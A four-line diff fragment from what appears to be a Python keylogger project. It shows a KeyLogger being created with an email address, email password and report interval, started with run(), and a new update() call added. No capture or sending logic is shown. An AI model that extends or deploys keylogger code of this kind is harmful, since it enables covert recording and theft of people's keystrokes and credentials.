@@ -141,3 +141,4 @@ finally:
 
     keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
     keylogger.run()
+    keylogger.update()
